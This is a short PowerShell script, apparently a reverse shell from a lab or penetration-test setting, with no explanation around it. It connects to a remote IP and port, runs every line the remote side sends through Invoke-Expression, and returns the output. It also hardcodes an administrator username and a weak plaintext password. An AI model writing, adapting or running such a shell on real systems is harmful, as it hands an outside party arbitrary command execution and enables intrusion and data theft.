$username = "administrator"
$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force

# Create a credential object (Not used in TCP, but available for other auth mechanisms)
$credential = New-Object System.Management.Automation.PSCredential($username, $password)

# Define the target IP and port
$targetIP = "192.168.45.191"
$targetPort = 1710

try {
    # Establish a TCP connection
    $client = New-Object System.Net.Sockets.TCPClient
    $client.Connect($targetIP, $targetPort)

    Write-Host "Connected to $targetIP on port $targetPort"

    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
    $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
    $writer.AutoFlush = $true

    while ($true) {
        $receivedData = $reader.ReadLine()
        if ([string]::IsNullOrEmpty($receivedData)) {
            Write-Host "Connection closed by server"
            break
        }

        Write-Host "Received Command: $receivedData"
        
        try {
            $output = Invoke-Expression $receivedData 2>&1 | Out-String
        } catch {
            $output = "Error executing command: $_"
        }

        Write-Host "Sending Response: $output"

        # Send output back to the server
        $writer.WriteLine($output)
    }
} catch {
    Write-Host "Error: $_"
} finally {
    if ($client.Connected) { $client.Close() }
    Write-Host "Connection closed."
}
